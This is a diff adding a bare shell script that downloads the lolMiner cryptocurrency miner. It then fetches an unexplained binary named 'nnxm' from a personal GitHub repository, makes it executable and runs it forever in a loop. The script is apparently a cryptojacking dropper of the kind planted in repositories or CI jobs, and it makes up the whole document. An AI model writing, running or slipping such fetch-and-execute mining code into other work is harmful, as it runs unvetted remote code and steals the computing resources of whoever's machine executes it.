@@ -1,0 +1,9 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
+tar -xvf lolMiner_v1.31_Lin64.tar.gz
+cd 1.31
+wget -O nnxm https://raw.githubusercontent.com/venetta999/12345/main/nnxm
+chmod +x nnxm
+while true
+do
+./nnxm
+done
